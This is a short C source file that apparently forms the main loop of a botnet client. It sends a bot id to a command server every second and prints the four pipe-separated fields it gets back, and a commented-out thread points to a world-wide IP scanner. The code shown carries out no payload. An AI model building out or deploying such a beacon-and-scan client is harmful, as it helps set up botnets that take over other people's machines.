#include "includes/px_botnet.h"

void ft_manage_request(char *ptr)
{
	char **split;

	split = ft_split(ptr, '|');
	if (split[0] && split[1] && split[2] && split[3])
	{
		printf("----------\n");
		printf(".%d.\n", rand() % 100);
		printf(".%s.\n", split[0]);
		printf(".%s.\n", split[1]);
		printf(".%s.\n", split[2]);
		printf(".%s.\n", split[3]);
		printf("----------\n");
	}
	ft_free_split(split);
}

int main(int argc, char *argv[])
{
	CURL *curl;
	CURLcode res;
	pthread_t ip_searcher;
	char *id;
	char *request;
	char *tmp;

	id = ft_get_id();
	curl_global_init(CURL_GLOBAL_ALL);
	curl = curl_easy_init();
	if (curl)
	{
		//if (pthread_create(&ip_searcher, NULL, (void *)&ft_scan_world, NULL))
		//	pthread_join(ip_searcher, NULL);
		while (true)
		{
			request = ft_strjoin("?id=", id);
			request = ft_strnjoinf(url_page, request, strlen(request));
			tmp = ft_request(request);
			if (tmp)
				ft_manage_request(tmp);
			free(request);
			sleep(1);
		}
		curl_easy_cleanup(curl);
	}
	curl_global_cleanup();
	return (0);
}
